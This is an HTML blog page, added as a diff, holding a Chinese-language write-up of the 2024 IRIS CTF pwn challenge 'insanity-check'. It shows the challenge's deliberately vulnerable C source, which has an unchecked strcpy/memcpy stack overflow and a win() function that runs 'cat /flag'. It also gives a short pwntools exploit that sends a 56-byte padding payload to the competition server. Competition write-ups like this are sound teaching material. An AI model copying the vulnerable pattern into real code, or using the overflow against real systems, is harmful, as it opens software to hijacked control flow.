@@ -1,0 +1,83 @@
+<!doctype html>
+<html lang="zh-CN" data-base="/">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>2024 IRIS CTF-PWN-[insanity-check] · Y0uYuGe</title>
+<meta name="description" content="注意到溢出后字符串末尾的 .com 加上四个空字节正好是 win() 函数的地址——直接溢出即可。">
+<link rel="stylesheet" href="/blog/article.css">
+</head>
+<body data-page="article">
+<header class="bar">
+  <a class="brand" href="/">Y0uYuGe</a>
+  <a class="tomap" href="/#/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20IRIS%20CTF-PWN-%5Binsanity-check%5D" title="在导图上看这篇文章的位置">◎ 在导图中查看</a>
+</header>
+<div class="wrap">
+  <main class="post">
+    <nav class="crumbs"><a href="/#/">Y0uYuGe</a><span class="sep">›</span><a href="/#/endpoint-security">终端安全</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn">CTF 与 Pwn</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/challenge-writeups">题解</a><span class="sep">›</span><a href="/#/endpoint-security/ctf-and-pwn/challenge-writeups/2024">2024 年</a></nav>
+    <h1>2024 IRIS CTF-PWN-[insanity-check]</h1>
+    <div class="meta"><time>2024-01-06</time><span class="tag">#CTF-PWN</span><span class="tag">#Pwn</span><span class="tag">#CTF</span></div>
+    <article class="post-body">
+<h1 id="attributesectionflag"><strong>attribute</strong>((section(&quot;.flag&quot;)))</h1>
+<p><a href="https://www.cnblogs.com/hellokitty2/p/15721408.html">attribute 相关知识</a>
+<a href="https://blog.csdn.net/sadshen/article/details/9419267">attribute 相关知识</a></p>
+<h1 id="insanity-check">insanity-check</h1>
+<h1 id="源码">源码</h1>
+<p>注意到溢出后字符串末尾的 .com 加上四个空字节正好是 win() 函数的地址——直接溢出即可</p>
+<pre><code class="language-python">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;string.h&gt;
+
+void rstrip(char* buf, const size_t len) {
+    for (int i = len - 1; i &gt;= 0; i--)
+        if (buf[i] == &#39;\n&#39;) {
+            buf[i] = &#39;\0&#39;;
+            break;
+        }
+}
+
+const char suffix[] = &quot;! Welcome to IrisCTF2024. If you have any questions you can contact us at test@example.com\0\0\0\0&quot;;
+
+int main() {
+    char message[128];
+    char name[64];
+    fgets(name, 64, stdin);
+    rstrip(name, 64);
+
+    strcpy(message, &quot;Hi there, &quot;);
+    strcpy(message + strlen(message), name);
+    memcpy(message + strlen(message), suffix, sizeof(suffix));
+
+    printf(&quot;%s\n&quot;, message);
+}
+
+__attribute__((section(&quot;.flag&quot;)))
+void win() {
+    __asm__(&quot;pop %rdi&quot;);
+    system(&quot;cat /flag&quot;);
+}
+//0x000000006d6f632e
+</code></pre>
+<h1 id="exp">exp</h1>
+<pre><code class="language-python">from pwn import*
+context(os=&quot;linux&quot;,arch=&quot;amd64&quot;,log_level=&quot;debug&quot;)
+v=remote(&quot;insanity-check.chal.irisc.tf&quot;, 10003)
+#最后字符串正好是win函数地址0x000000006d6f632e
+
+payload=56*b&quot;a&quot;
+sleep(3)
+v.sendline(payload)
+v.recvall()
+
+v.interactive()
+</code></pre>
+
+    </article>
+    
+    <nav class="pn"><a href="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20HNCTF%20PWN/"><span class="l">上一篇</span>2024 HNCTF PWN</a><a href="/workspace/endpoint-security/ctf-and-pwn/challenge-writeups/2024/2024%20SEKAI-CTF%20(nolibc%20speedpwn%20life_simulator_2)/"><span class="l">下一篇</span>2024 SEKAI-CTF (nolibc speedpwn life_simulator_2)</a></nav>
+  </main>
+  
+</div>
+<script type="module" src="/blog/article.js"></script>
+</body>
+</html>
